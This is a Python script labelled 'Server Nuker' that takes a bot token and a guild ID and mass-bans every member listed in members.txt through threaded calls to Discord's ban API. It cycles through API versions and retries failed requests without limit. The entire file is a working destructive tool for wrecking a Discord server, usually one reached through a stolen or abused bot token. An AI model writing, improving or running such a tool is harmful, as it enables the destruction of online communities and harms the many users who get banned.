try:
    from concurrent.futures import ThreadPoolExecutor
    import random, time, os, httpx
    from colorama import Fore, Style
except ImportError:
    print("Error [!] -> Modules Are not installed")
os.system("cls & mode 80, 23 & title Server Nuker Made By rockstar#0002")

token, guild = input("Token -> "), input("\nGuild ID -> ")


threads = []
apiv = [6, 7, 8, 9]
codes = [200, 201, 204]


os.system("cls & mode 80, 23")


def worker(user: str):
    try:
        response = httpx.put(
            "https://discord.com/api/v{}/guilds/{}/bans/{}".format(
                random.choice(apiv), guild, user, time.sleep(0.050)
            ),
            headers={"Authorization": f"Bot {token}"},
        )
        if response.status_code in codes:
            print(
                f"{Fore.CYAN}{Style.BRIGHT} Succesfully Punished User --> {Fore.RESET}"
                + user
            )
        else:
            return worker(user)
    except (Exception):
        return worker(user)


def theadpool():
    with ThreadPoolExecutor() as executor:

        with open("members.txt") as f:
            Ids = f.readlines()

        for user in Ids:
            threads.append(executor.submit(worker, user))


if __name__ == "__main__":
    theadpool()
